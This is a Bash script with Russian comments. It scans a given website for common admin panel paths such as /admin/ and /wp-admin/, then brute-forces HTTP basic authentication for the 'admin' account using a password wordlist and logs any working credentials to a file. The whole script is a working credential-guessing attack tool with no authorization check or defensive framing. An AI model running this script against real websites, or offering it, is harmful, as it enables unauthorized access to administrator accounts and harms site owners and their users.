#!/bin/bash

# Проверяем, передан ли аргумент (URL веб-сайта)
if [ -z "$1" ]; then
    echo "Использование: $0 <URL веб-сайта>"
    exit 1
fi

website="$1"

# Путь к файлу с wordlist
wordlist="wordlist.txt"

# Список известных уязвимых страниц административных панелей
vulnerable_pages=(
    "/admin/"
    "/login/"
    "/wp-admin/"
    "/admin/login.php"
    # Добавьте другие уязвимые страницы, если они известны
)

# Функция для печати сообщения с цветом
print_color_message() {
    local message=$1
    local color=$2
    case $color in
        "green")
            echo -e "\e[32m${message}\e[0m"
            ;;
        "red")
            echo -e "\e[31m${message}\e[0m"
            ;;
        *)
            echo "${message}"
            ;;
    esac
}

# Функция для проверки уязвимых страниц
check_vulnerable_pages() {
    print_color_message "Начато сканирование уязвимых страниц..." "green"
    for page in "${vulnerable_pages[@]}"; do
        response=$(curl -s -o /dev/null -w "%{http_code}" "${website}${page}")
        if [ $response -eq 200 ]; then
            print_color_message "Найдена уязвимая страница: ${website}${page}" "green"
            echo "${website}${page}" >> logs.txt
        elif [ $response -ne 404 ]; then
            print_color_message "Ошибка при запросе ${website}${page}. HTTP код: $response" "red"
        fi
    done
}

# Функция для проверки стандартных логинов и паролей
check_default_credentials() {
    if [ ! -f "$wordlist" ]; then
        echo "Файл wordlist.txt не найден."
        exit 1
    fi
    
    print_color_message "Начато сканирование стандартных учетных данных..." "green"
    while IFS= read -r password; do
        response=$(curl -s -o /dev/null -w "%{http_code}" --user "admin:$password" "${website}/admin/")
        if [ $response -eq 200 ]; then
            print_color_message "Найден рабочий пароль администратора: admin:$password" "green"
            echo "admin:$password" >> logs.txt
        elif [ $response -ne 401 ]; then
            print_color_message "Ошибка при запросе с паролем $password. HTTP код: $response" "red"
        fi
    done < "$wordlist"
}

# Основная часть скрипта

check_vulnerable_pages
check_default_credentials

if [ ! -s logs.txt ]; then
    print_color_message "Не найдено уязвимостей и стандартных учетных данных." "green"
fi
